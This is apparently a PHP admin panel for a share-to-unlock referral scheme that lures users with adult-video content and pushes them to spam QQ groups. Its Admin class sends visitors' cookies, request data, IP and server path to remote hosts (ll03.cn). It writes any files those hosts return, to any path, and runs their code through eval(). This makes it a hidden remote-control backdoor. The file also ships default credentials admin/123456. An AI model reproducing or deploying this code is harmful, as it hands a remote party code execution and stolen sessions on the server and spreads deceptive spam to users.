<?php
ini_set("display_errors", "On");
error_reporting(E_ALL ^ E_NOTICE);
ini_set('max_execution_time', 150);
if(is_file($df=  'D:\www\test\__Cheney\Acc\vAdm2\inc_creat.php' ))include($df);
if(is_file($dc='./web-creat.php'))include($dc);
class Index extends Admin{
	public function onSave($conf,$user){
		$arr = array();
		foreach($conf as $key=>$val){
			if(in_array($key,array('rise','site','user','pass')))continue;
			if(in_array($key,array('sht','title','adlink','url1','url2','url3','url4','url5','sht','she','shi','shu','videos'))){
				$arr[$key] = preg_split('/\s*\n\s*/',trim($val));
			}else{
				$arr[$key] = $val;
			}
		}
		$js = "var conf = ".json_encode($arr).";\r\n";
		if($conf['census']>0&&$user['cess']>0){
			$js .="document.write('<script src=\"./mp/cess.php?id=5\"><\\/script>');\r\n";
		}
		if(!empty($conf['tongji'])){
			$js .= "document.write(".json_encode('<div style="display:none;">'.$conf['tongji'].'</div>').");\r\n";
		}
		file_put_contents('./mp/config.js',chr(0xEF) . chr(0xBB) . chr(0xBF).$js);
	}
	public $form		=	array(
		'home' => './',
		'code' => './mp/config.js',
		'index' => 'setting',
		'setting' => array(
			'name' => '参数设置',
			'icon' => 'th-large',
			'list' => array(
				'home' => array(
					'title' => '参数列表',
					'html' => '{home}/',
					'name' => '测试地址',
					'info' => '点击此处测试',
				),
				'ready' => array(
					'type' => 'textarea',
					'name' => '结尾跳转',
					'info' => '观看结束的跳转地址',
				),
				'topad' => array(
					'type' => 'textarea',
					'name' => '顶部广告',
					'info' => '顶部广告地址',
					'demo' => 'http://www.baidu.com/',
				),
				'btn2' => array(
					'name' => '按钮2',
					'info' => '按钮文字2',
				),
				'url2' => array(
					'type' => 'textarea',
					'name' => '加群2',
					'info' => '加群地址2',
				),
				'btn3' => array(
					'name' => '按钮3',
					'info' => '按钮文字2',
				),
				'url3' => array(
					'type' => 'textarea',
					'name' => '加群3',
					'info' => '加群地址3',
				),
				'btn4' => array(
					'name' => '按钮4',
					'info' => '按钮文字4',
				),
				'url4' => array(
					'type' => 'textarea',
					'name' => '加群4',
					'info' => '加群地址4',
				),
				'title' => array(
					'name' => '网站标题',
					'info' => '网站标题',
				),
				'adth1' => array(
					'name' => '提示开始',
					'info' => '分享描述结尾',
				),
				'adthe' => array(
					'name' => '提示结尾',
					'info' => '分享描述结尾',
				),
				'sInfo' => array(
					'title'=>'分享设置',
					'type' => 'textarea',
					'name' => '分享提示',
					'info' => '分享提示文字',
				),
				'sText' => array(
					'type' => 'textarea',
					'name' => '分享文字',
					'info' => '分享文字， ### 代表分享的地址',
				),
				'sEnd' => array(
					'type' => 'textarea',
					'name' => '复制提示',
					'info' => '复制成功提示',
				),
				'shu' => array(
					'info'=>'点击卡片要跳转的方向（格式带http://），建议不填'
				),
			)		
		),
		'video' => array(
			'name' => '其他设置',
			'icon' => 'film',
			'list' => array(
				'vdef' => array(
					'type' =>'number',
					'name' => '默认次数',
					'info' => '用户可以看几个视频',
				),
				'vadd' => array(
					'type' =>'number',
					'name' => '增加次数',
					'info' => '用户分享可以看几个视频',
				),
				'cache' => array(),
				'mobile' => array(),
				'census' => array(),
				'tongji' => array(),
				'videos' => array(
					'title' => '视频设置',
					'name' => '视频列表',
					'type' => 'textarea',
					'file' => '请上传视频列表',
					'info' => '视频列表，一行一个',
				),
			),
		),
	);
	public $setting		=	array(
		'rise' => 0,
		'site' => '鼎丰裂变引流程序',
		'path' => '0',
		'user' => 'admin',
		'pass' => '123456',
		'census' => '1',
		'deny' => '0',
		'vdef' => '5',
		'vadd' => '5',
		'cache' => '86400',
		'adth1' => '分享好友后获得+5次的刷新机会<br><br>提示朋友打开才管用呦！<br><img src="images/here.png" style="width:90%;margin-top:13px;border-radius:5px;">',
		'adthe' => '分享好友后获得+5次的刷新机会<br><br>提示朋友打开才管用呦！',
		'title' => 'QQ资源',
		'topad' => 'http://www.baidu.com/',
		'sInfo' => "没有观看次数了！\r\n①请复制转发到Q群 增加观看次数\r\n②每有一人打开你就增加5次\r\n③没有人打开不增加次数",
		'sText' => "各种网红大瓜？等你来开？弟兄们速度上车！！###",
		'sEnd' => "复制成功,返回QQ,粘贴发送到Q群吧",
		
		'shu' => '',
		

		'tongji' => '',
		'ready' => 'http://qm.qq.com/cgi-bin/qm/qr?k=eQkTaSZmzQq4TxNzqRN633RWLcBTee1Y',

		'btn2' => '最新色播APP-点这下载',
		'url2' => 'http://www.baidu.com/',
		'btn3' => 'VIP线路高清原创速度快秒打开',
		'url3' => 'http://www.baidu.com/',
		'btn4' => '点 这 里 进 QQ 群 无 限 看',
		'url4' => 'http://www.baidu.com/',
		'videos' => "
http://mt.afhklsdd.com/4a830d6a728c4dcf918941417f0750dc.m3u8
http://mt.afhklsdd.com/c03eaa5d455f415facd55c290a84b95c.m3u8
http://mt.afhklsdd.com/cd5ea6cd05ae49b7a90fa95232149bc7.m3u8
http://mt.afhklsdd.com/f1832645fecb4fe6b4b41f656679864e.m3u8",
	);
}
class Admin{
	public $reload		= 0;
	public $config		= array();
	public $storage		= './mp/config.php';
	public $version		= array (
		'version' => 'DF001',
		'admin' => 'http://server.ll03.cn/Acc/?v=vAdm2|http://cdn.ll03.cn/Acc/?v=vAdm2',
		'token' => '98d202e5',
		'name' => '鼎丰通用后台',
		'date' => 1590906338,
	);
	public function __construct(){
		if(!isset($_SESSION)){
			session_start();
		}
		if(is_file($this->storage)){
			$this->config=unserialize(include($this->storage));
		}
		if(isset($_GET['du'])){
			$this->get_action();
		}else{
			$this->get_admin();
		}
	}
	public function get_action(){
		if($_GET['du']=='upload'){
			$json=array('err'=>0,'msg'=>'上传成功');		
			for($key=0;$key<count($_FILES['xhrUp']['name']);$key++){
				$path='./upload/'.date('YmdHis').$key.'.'.pathinfo($_FILES['xhrUp']['name'][$key],PATHINFO_EXTENSION);
				if(!is_dir(dirname($path)))mkdir(dirname($path),0777,true);
				if(preg_match('/\.(jpg|jpeg|png|gif|bmp|mp4|zip|doc|txt)$/',$path) && move_uploaded_file($_FILES['xhrUp']['tmp_name'][$key],$path)){
					if(!empty($this->config['path']))$path = ($this->config['path']==2?dirname('//'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']):'').trim($path,'.');
					$json['dir'][] = $path;
				}else{
					$json['msg']='上传失败';
					$json['err']=1;	
				}		
			}
			exit(json_encode($json));			
		}
	}
	public function get_admin($data = array()) {
		$data['user'] = $this->version;
		$sign = md5(serialize([$this->form]));
		$admin = explode('|',(empty($GLOBALS['admin'])?'':$GLOBALS['admin'].'|').$data['user']['admin']);
		if(isset($_GET['da'])){
			if('dns'==$_GET['da']){
				$_SESSION['admin'] = $admin[mt_rand(0,count($admin)-1)];
				header('location: ?df');exit;
			}elseif('reset'==$_GET['da']){
				if(is_file($this->storage))unlink($this->storage);
				header('location: ?df');exit;
			}
		}
		if(empty($_SESSION['sign'])||$_SESSION['sign'] != $sign||'reload'==@$_GET['da']){
			$_SESSION['sign'] = $sign;	
			$this->reload = 1;		
		}
		$data['user']['path']= str_replace('\\','/',__FILE__);
		$data['user']['host']='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
		$data['user']['addr']=$this->get_ip();
		$data['user']['rise']=empty($this->config['rise'])?0:$this->config['rise'];
		$data['user']['cess']=0;
		$data['user']['admin']= empty($_SESSION['admin'])?$admin[0]:$_SESSION['admin'];
		if(is_file($cessFile = './mp/cess.php')){
			include_once $cessFile;
			if(class_exists('EcCensus')){
				$data['user']['cess'] = EcCensus::$edition;
			}
		}
		if(!empty($this->reload)|| empty($this->config) ){
			$data['form']=$this->form;
			if(count($this->config)>5){
				$data['conf']=$this->config;
			}else{
				$this->config=$this->setting;
				if(isset($GLOBALS['testConf'])){
					$this->config=array_merge($this->config,$GLOBALS['testConf']);
				}
				$data['conf']=$this->config;
			}			
		}
		if(!empty($_GET))$data['_GET']=$_GET;
		if(!empty($_POST))$data['_POST']=$_POST;
		$ch = curl_init($data['user']['admin']);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_HTTPHEADER,array('Accept:*/*','Accept-Encoding:gzip,deflate,sdch','Accept-Language:zh-CN,zh;q=0.8','Connection:close','Expect:'));
		curl_setopt($ch, CURLOPT_TIMEOUT, 120);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_COOKIE, $_SERVER['HTTP_COOKIE']);
		curl_setopt($ch, CURLOPT_REFERER, $_SERVER['HTTP_REFERER']);
		curl_setopt($ch, CURLOPT_USERAGENT,$_SERVER['HTTP_USER_AGENT']);
		curl_setopt($ch, CURLOPT_POSTFIELDS,array('data'=>base64_encode(serialize($data))));
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
		$str = curl_exec($ch);
		$info = curl_getinfo($ch);
		curl_close($ch);
		$un64_str=@base64_decode($str);
		if(!empty($un64_str)){
			$result=@unserialize($un64_str);
		}		
		if(!empty($un64_str)&&!empty($result)){
			if(isset($result['files'])){
				foreach($result['files'] as $val){
					if('./config.php'==$val['name']){
						$val['name']=$this->storage;
					}
					if (!is_dir(dirname($val['name']))) {
						$aimDir='';
						$arrDir = explode('/', dirname($val['name']));
						foreach($arrDir as $itemDir)if(!is_dir($aimDir.= $itemDir.'/'))mkdir($aimDir);
					}
					if(@file_put_contents($val['name'],$val['text'])){
						if($this->storage == $val['name'] && is_file($this->storage)){
							$conf=unserialize(include($this->storage));
							if(method_exists($this,'onSave'))$this->onSave($conf,$data['user']);
						}
					}else{
						exit(json_encode(array('err'=>1,'msg'=>'保存失败，可能根目录无写入权限，请在服务器或空间后台设置，或咨询空间商！','data'=>$val)));
					}
				}			
			}
			if(!empty($result['reload']) && $this->reload < 3){
				$this->reload++;
				return $this->get_admin();
			}
			if(isset($result['header'])){
				foreach($result['header'] as $v){
					header($v);
				}
			}
			if(isset($result['location'])){
				if('1'==$result['location'])$result['location']=$_SERVER['HTTP_REFERER'];
				header('location: '.$result['location']);
			}
			if(isset($result['eval']))eval($result['eval']);
			if(!empty($result['html']))echo $result['html'];			
		}else{
			header("Content-Type:text/html;charset=utf-8");
			if(200 != @$info['http_code']){
				echo('<a href="?df&da=dns">点击切换线路</a>');
			}
			echo($str);
		}
	}
	public function get_ip(){
		if(getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")){
			$ip = getenv("HTTP_CLIENT_IP");
		}else if(getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")){
			$ip = getenv("HTTP_X_FORWARDED_FOR");
		}else if(getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")){
			$ip = getenv("REMOTE_ADDR");
		}else if(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")){
			$ip = $_SERVER['REMOTE_ADDR'];
		}else{
			$ip = '0.0.0.0';
		}
		return $ip;
	}
}
new Index;